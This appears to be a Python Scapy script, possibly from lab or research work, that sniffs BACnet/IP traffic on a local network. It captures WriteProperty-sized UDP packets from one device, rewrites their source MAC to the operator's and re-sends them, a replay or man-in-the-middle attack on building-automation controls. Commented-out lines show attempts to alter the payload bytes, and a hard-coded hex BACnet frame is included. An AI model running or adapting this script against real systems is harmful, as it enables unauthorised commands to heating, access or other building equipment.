#import re
#from time import sleep
import binascii
import random, string
from scapy.all import *

DST_IP1 = '192.168.10.10'
DST_IP2 = '192.168.10.40'

M_MAC = '00:05:1b:a8:6d:d3'#自分のMACアドレス

T_MAC1 = '74:3a:65:84:c7:82'
T_MAC2 = '00:c0:8f:82:a3:25'
#T_MAC1 = '00:40:1a:1e:e8:35' #192.168.24.10
#T_MAC2 = '74:2b:62:6b:bc:89' #192.168.24.254
#T_MAC1 = '00:50:ff:0b:12:72'#192.168.27.11
#T_MAC2 = '00:40:1a:1e:58:43'#192.168.27.14

PROTO_NUM = 17 #icmp:1 tcp:6 udp:17
PORT_NUM = 47808 #bacnet:47808
CH_POS = 114
TH1 = 71 #WriteProperty:71
PTYPE = 2048 #ipv4:2048

IF = "en8"
FILTER = "ether src "+ T_MAC1 +" and not ether src "+ M_MAC

A_WORD ="810a0019010400045b100c010012011e09552e91002f39081f"

def relay_process(pkt):
    print("roop\n")
    #if pkt[Ether].src == T_MAC1:
    #    pkt[Ether].dst = T_MAC2
    #elif pkt[Ether].src == T_MAC2:
    #    pkt[Ether].dst = T_MAC1
    #else:return
    if pkt[Dot1Q].type == PTYPE:
        if pkt[IP].proto == PROTO_NUM:
            if pkt[UDP].dport == PORT_NUM and len(pkt) == TH1 :
                target(pkt)
    
    #sendp(pkt,iface=IF)

def target(pkt):
    #print("Target!\n")
    
    print(pkt[Raw].load.hex())
    bstr = str(pkt[Raw].load.hex())

    #LEN = len(bstr)

    #tstr = bstr[CH_POS:CH_POS+8]
    #tmp = tstr.split('0008')
    #tmp[3]='00000020'
    pkt[Ether].src = M_MAC
    pkt[UDP].chksum = None

    #bstr = bstr[0:LEN-20]+"1111"+bstr[LEN-16:]
    #bstr = '80'+bstr[2:LEN-6]+"40ff"+bstr[LEN-2:]
    
    #tstr = ''.join(random.sample(tstr, len(tstr)))
    #bstr = bstr.replace('00000','00001')
    #bstr = bstr[0:CH_POS]+tstri
    #print(tstr)
    #pkt[Raw].load=binascii.unhexlify(bstr)
    #print(bytes(bstr.encode()))
    #print(bstr)
    sendp(pkt,iface=IF)

sniff(iface=IF, prn=relay_process, filter=FILTER, store=0)


